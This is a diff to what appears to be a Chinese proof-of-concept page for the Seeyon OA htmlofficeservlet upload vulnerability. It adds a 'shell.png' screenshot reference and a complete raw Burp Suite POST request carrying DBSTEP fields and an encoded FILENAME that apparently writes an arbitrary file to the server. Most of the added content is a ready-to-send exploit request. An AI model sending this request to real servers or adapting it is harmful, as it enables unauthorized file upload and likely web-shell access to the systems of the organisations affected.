@@ -354,6 +354,7 @@ Encode FILENAME= qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiV
 ## POST报文验证
 
 ![](./poc.png)
+![](./shell.png)
 
 `python poc.py`
 
@@ -374,3 +375,30 @@ while(1):
             print "-"*50
 ```
 
+Burpsuite
+
+```
+POST /seeyon/htmlofficeservlet HTTP/1.1
+Host: x.x.x.x:80
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Forwarded-For: 127.0.0.1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 436
+
+DBSTEP V3.0     354             0               18             DBSTEP=OKMLlKlV
+OPTION=S3WYOSWLBSGr
+currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+CREATEDATE=wUghPB3szB3Xwg66
+RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
+originalFileId=wV66
+originalCreateDate=wUghPB3szB3Xwg66
+FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATddA0jcQhUcATRnYd5NrJ3
+needReadFile=yRWZdAS6
+originalCreateDate=wLSGP4oEzLKAz4=iz=66
+test23123123123123
+```
